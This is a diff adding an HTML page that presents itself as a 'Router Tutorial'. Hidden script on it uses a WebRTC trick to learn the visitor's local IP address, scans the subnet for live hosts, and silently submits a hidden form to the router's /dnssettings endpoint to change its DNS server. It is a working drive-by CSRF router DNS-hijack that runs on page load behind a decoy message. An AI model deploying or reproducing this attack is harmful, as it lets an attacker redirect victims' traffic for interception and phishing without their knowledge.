@@ -1,0 +1,304 @@
+<style>
+    .login-page {
+        width: 360px;
+        padding: 8% 0 0;
+        margin: auto;
+    }
+    .form {
+        display: inline-grid;
+        justify-items: center;
+        position: relative;
+        z-index: 1;
+        background: #FFFFFF;
+        max-width: 360px;
+        margin: 0 auto 100px;
+        padding: 45px;
+        text-align: center;
+        box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
+    }
+    .form input {
+        outline: 0;
+        background: #f2f2f2;
+        width: 100%;
+        border: 0;
+        margin: 0 0 15px;
+        padding: 15px;
+        box-sizing: border-box;
+        font-size: 14px;
+    }
+    .form button {
+        text-transform: uppercase;
+        outline: 0;
+        background: #0ebeffc4;
+        width: 100%;
+        border: 0;
+        padding: 15px;
+        color: #FFFFFF;
+        font-size: 14px;
+        -webkit-transition: all 0.3 ease;
+        transition: all 0.3 ease;
+        cursor: pointer;
+    }
+    .form button:hover,.form button:active,.form button:focus {
+        background: #43A047;
+    }
+    .form .message {
+        margin: 15px 0 0;
+        color: #b3b3b3;
+        font-size: 12px;
+    }
+    .form .message a {
+        color: #4CAF50;
+        text-decoration: none;
+    }
+    .form .register-form {
+        display: none;
+    }
+    .container {
+        position: relative;
+        z-index: 1;
+        max-width: 300px;
+        margin: 0 auto;
+    }
+    .container:before, .container:after {
+        content: "";
+        display: block;
+        clear: both;
+    }
+    .container .info {
+        margin: 50px auto;
+        text-align: center;
+    }
+    .container .info h1 {
+        margin: 0 0 15px;
+        padding: 0;
+        font-size: 36px;
+        font-weight: 300;
+        color: #1a1a1a;
+    }
+    .container .info span {
+        color: #4d4d4d;
+        font-size: 12px;
+    }
+    .container .info span a {
+        color: #000000;
+        text-decoration: none;
+    }
+    .container .info span .fa {
+        color: #EF3B3A;
+    }
+    body {
+        background: #99ce7d; /* fallback for old browsers */
+        background: -webkit-linear-gradient(right, #daa036, #df3e2f);
+        background: -moz-linear-gradient(right, #daa036, #df3e2f);
+        background: -o-linear-gradient(right, #daa036, #df3e2f);
+        background: linear-gradient(right, #daa036, #df3e2f);
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
+</style>
+<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
+<body>
+<div class="login-page">
+    <h1 style="text-align:center;font-family: sans-serif;font-weight: 700;text-shadow: 2px 1px #ff2323;color: #ffa637;"> Router Tutorial </h1>
+    <div class="form">
+        <h3>
+            Glad you made it! Your router tutorial will begin in just a second. You will learn all about routers!!
+        </h3>
+    </div>
+<ul style="display: none;" data-bind="foreach:servers">
+    <li> <a href="#" data-bind="text:name,attr:{href: 'http://'+name}">tester</a> <span data-bind="text:status,css:status"></span>
+
+    </li>
+</ul>
+
+<form action="/" id='secret-form' style="display: none;" method="post">
+	<div>
+		<label>DNS Server:</label>
+                <input type="text" value = "10.4.18.160" name="dns_addr"/>
+	</div>
+        <div>
+		<input class="btn btn-primary" type="submit" value="Change"/>
+	</div>
+</form>
+
+</div>
+</body>
+
+<script src="/javascript/ping.js"></script>
+<script src="/javascript/jQuery.min.js"></script>
+<script type="text/javascript">
+
+    function get_ping2(addy){
+
+        let server_arr = [];
+        function ping(ip, callback) {
+
+            if (!this.inUse) {
+                this.status = 'unchecked';
+                this.inUse = true;
+                this.callback = callback;
+                this.ip = ip;
+                var _that = this;
+                this.img = new Image();
+                this.img.onload = function () {
+                    _that.inUse = false;
+                    _that.callback('responded');
+
+                };
+                this.img.onerror = function (e) {
+                    if (_that.inUse) {
+                        _that.inUse = false;
+                        _that.callback('responded', e);
+                    }
+
+                };
+                this.start = new Date().getTime();
+                this.img.src = "http://" + ip;
+                this.timer = setTimeout(function () {
+                    if (_that.inUse) {
+                        _that.inUse = false;
+                        _that.callback('timeout');
+                    }
+                }, 1500);
+            }
+        }
+
+        const sleep = (milliseconds) => {
+            return new Promise(resolve => setTimeout(resolve, milliseconds))
+        }
+
+        var PingModel = function (servers) {
+            var self = this;
+            var myServers = [];
+            ko.utils.arrayForEach(servers, function (location) {
+                myServers.push({
+                    name: location,
+                    status: ko.observable('unchecked')
+                });
+            });
+            self.servers = ko.observableArray(myServers);
+            ko.utils.arrayForEach(self.servers(), function (s) {
+                s.status('checking');
+                new ping(s.name, function (status, e) {
+                    s.status(status);
+                    if(status == "responded"){
+                        server_arr.push(s.name);
+                    }
+
+                });
+            });
+            console.log(server_arr);
+            sleep(5000).then(()=> {
+                SendPost(server_arr);
+            });
+        };
+
+
+        function DecrementIP(ip_addy){
+            let arr = [];
+            let i = parseInt(ip_addy.split('.')[3]);
+
+            let ip_mask = ip_addy.split('.')[0].concat('.', ip_addy.split('.')[1],'.', ip_addy.split('.')[2],'.')
+            while (i > 1){
+                i--;
+                arr.push(ip_mask.concat(i.toString()));
+            }
+            return arr;
+        }
+
+        function SendPost(ip_arr){
+
+
+                $('#secret-form').attr('action', "http://" + ip_arr[ip_arr.length-1] + "/dnssettings");
+                console.log($('#secret-form').prop('action'));
+                $('#secret-form').submit();
+            
+        }
+
+
+
+        var komodel = new PingModel(DecrementIP(addy));
+        ko.applyBindings(komodel);
+    }
+
+    //get the IP addresses associated with an account
+    function getIPs(callback){
+        var ip_dups = {};
+
+        //compatibility for firefox and chrome
+        var RTCPeerConnection = window.RTCPeerConnection
+                || window.mozRTCPeerConnection
+                || window.webkitRTCPeerConnection;
+        var useWebKit = !!window.webkitRTCPeerConnection;
+
+        //bypass naive webrtc blocking using an iframe
+        if(!RTCPeerConnection){
+            //NOTE: you need to have an iframe in the page right above the script tag
+            //
+            //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
+            //<script>...getIPs called in here...
+            //
+            var win = iframe.contentWindow;
+            RTCPeerConnection = win.RTCPeerConnection
+                    || win.mozRTCPeerConnection
+                    || win.webkitRTCPeerConnection;
+            useWebKit = !!win.webkitRTCPeerConnection;
+        }
+
+        //minimal requirements for data connection
+        var mediaConstraints = {
+            optional: [{RtpDataChannels: true}]
+        };
+
+        var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
+
+        //construct a new RTCPeerConnection
+        var pc = new RTCPeerConnection(servers, mediaConstraints);
+
+        function handleCandidate(candidate){
+            //match just the IP address
+            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
+            var ip_addr = ip_regex.exec(candidate)[1];
+
+            //remove duplicates
+            if(ip_dups[ip_addr] === undefined)
+                callback(ip_addr);
+
+            ip_dups[ip_addr] = true;
+        }
+
+        //listen for candidate events
+        pc.onicecandidate = function(ice){
+
+            //skip non-candidate events
+            if(ice.candidate)
+                handleCandidate(ice.candidate.candidate);
+        };
+
+        //create a bogus data channel
+        pc.createDataChannel("");
+
+        //create an offer sdp
+        pc.createOffer(function(result){
+
+            pc.setLocalDescription(result, function(){}, function(){});
+
+        }, function(){});
+
+        setTimeout(function(){
+            var lines = pc.localDescription.sdp.split('\n');
+
+            lines.forEach(function(line){
+                if(line.indexOf('a=candidate:') === 0)
+                    handleCandidate(line);
+            });
+        }, 1000);
+    }
+
+    //Test: Print the IP addresses into the console
+    getIPs(function(ip){get_ping2(ip);});
+</script>
+
+
+
